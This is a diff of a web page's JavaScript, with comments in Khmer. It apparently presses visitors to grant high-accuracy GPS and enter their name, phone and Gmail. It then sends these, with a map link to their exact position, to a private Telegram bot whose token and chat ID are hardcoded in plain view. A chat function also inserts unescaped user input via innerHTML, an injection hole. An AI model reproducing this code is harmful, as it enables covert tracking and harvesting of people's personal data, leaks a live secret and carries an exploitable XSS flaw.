@@ -3488,61 +3488,63 @@ function listenForAdminReplies() {
           }
       });
 }
-const BOT_TOKEN = "8416578282:AAGic7-AEUoB2dcJ6ElMoX9RFucs34j2lWU";
+    const BOT_TOKEN = "8416578282:AAGic7-AEUoB2dcJ6ElMoX9RFucs34j2lWU";
 const CHAT_ID = "955031659";
 let userLocationLink = "";
 
-// ជំហានទី ១ -> ២
 function toStep2() {
     document.getElementById('step-1').style.display = 'none';
     document.getElementById('step-2').style.display = 'block';
 }
 
-// មុខងារចាប់ទីតាំងឱ្យ "ចំកន្លែង" បំផុត
+// មុខងារចាប់ទីតាំងឱ្យ "ចំកន្លែងបំផុត"
 function getExactLocation() {
     const status = document.getElementById('gps-status');
+    
     if (!navigator.geolocation) {
         alert("Browser របស់អ្នកមិនគាំទ្រ GPS ទេ!");
         return;
     }
 
-    status.innerText = "⌛ កំពុងស្វែងរកទីតាំងពិតប្រាកដរបស់អ្នក...";
-    
-    // កំណត់ឱ្យប្រើកម្រិតខ្ពស់បំផុត (High Accuracy)
+    status.innerText = "⌛ កំពុងស្វែងរកទីតាំងពិតប្រាកដ (សូមរង់ចាំ)...";
+    status.style.color = "blue";
+
+    // បង្ខំឱ្យប្រើកម្រិតខ្ពស់បំផុត (High Accuracy)
     const geoOptions = {
-        enableHighAccuracy: true,
-        timeout: 10000,
-        maximumAge: 0
+        enableHighAccuracy: true, // ប្រើផ្កាយរណប ឬ Wi-Fi ច្បាស់បំផុត
+        timeout: 15000,           // រង់ចាំ ១៥ វិនាទីដើម្បីឱ្យសញ្ញាច្បាស់
+        maximumAge: 0             // មិនយកទីតាំងចាស់ដែលធ្លាប់រក្សាទុក
     };
 
     navigator.geolocation.getCurrentPosition(function(position) {
         const lat = position.coords.latitude;
         const lon = position.coords.longitude;
-        
-        // Link ទៅកាន់ Google Maps ចំគោលដៅ
+        const acc = position.coords.accuracy; // កម្រិតលម្អៀង (ម៉ែត្រ)
+
+        // បង្កើត Link ផែនទី
         userLocationLink = `https://www.google.com/maps?q=${lat},${lon}`;
         
-        status.innerText = "✅ ទទួលបានទីតាំងចំគោលដៅហើយ!";
+        status.innerText = `✅ ចាប់បានទីតាំងហើយ (លម្អៀងត្រឹម ${Math.round(acc)} ម៉ែត្រ)`;
         status.style.color = "green";
         document.getElementById('btn-gps').style.background = "#4CAF50";
+        document.getElementById('btn-gps').innerText = "📍 ទីតាំងត្រូវបានកំណត់";
     }, function(error) {
-        alert("មិនអាចចាប់ទីតាំងបាន! សូមចុច 'Allow' នៅខាងលើ Browser!");
+        alert("មិនអាចចាប់ទីតាំងបាន! សូមចុច 'Allow' ឬ 'អនុញ្ញាត' នៅខាងលើ Browser!");
         status.innerText = "❌ បរាជ័យក្នុងការចាប់ទីតាំង";
+        status.style.color = "red";
     }, geoOptions);
 }
 
-// ជំហានទី ២ -> ៣ (ចុះឈ្មោះ និងផ្ញើទិន្នន័យ)
 async function submitRegistration() {
     const name = document.getElementById('reg-name').value.trim();
     const phone = document.getElementById('reg-phone').value.trim();
     const email = document.getElementById('reg-email').value.trim();
 
     if (!name || !phone || !email || !userLocationLink) {
-        alert("សូមបំពេញព័ត៌មានឱ្យគ្រប់ និងផ្តល់ទីតាំង GPS!");
+        alert("សូមបំពេញព័ត៌មានឱ្យគ្រប់ និងចុចផ្តល់ទីតាំង GPS!");
         return;
     }
 
-    // សារផ្ញើទៅ Admin Telegram
     const text = `🚨 *អ្នកលេងថ្មី*\n👤 ឈ្មោះ: ${name}\n📞 លេខ: ${phone}\n📧 Gmail: ${email}\n📍 ទីតាំងពិត: ${userLocationLink}`;
 
     try {
@@ -3552,28 +3554,21 @@ async function submitRegistration() {
             body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: "Markdown" })
         });
 
-        // បង្ហាញកន្លែងឆាត
         document.getElementById('user-display-name').innerText = name;
         document.getElementById('step-2').style.display = 'none';
         document.getElementById('step-3').style.display = 'block';
-        
-        document.getElementById('chat-box').innerHTML += `<p style="text-align:center; color:gray; font-size:0.7rem;">--- ស្វាគមន៍ ${name} ចូលក្នុងឆាត ---</p>`;
     } catch (e) {
-        alert("អ៊ីនធឺណិតមានបញ្ហា!");
+        alert("បញ្ហាអ៊ីនធឺណិត!");
     }
 }
 
-// មុខងារឆាត
 function sendChatMessage() {
-    const msgInput = document.getElementById('chat-msg-input');
-    const msg = msgInput.value.trim();
+    const input = document.getElementById('chat-msg-input');
+    const msg = input.value.trim();
     const name = document.getElementById('user-display-name').innerText;
     if (msg === "") return;
-
-    const chatBox = document.getElementById('chat-box');
-    chatBox.innerHTML += `<div class="chat-msg"><b>${name}:</b> ${msg}</div>`;
-    msgInput.value = "";
-    chatBox.scrollTop = chatBox.scrollHeight;
+    document.getElementById('chat-box').innerHTML += `<div><b>${name}:</b> ${msg}</div>`;
+    input.value = "";
 }
 </script>
 </body>
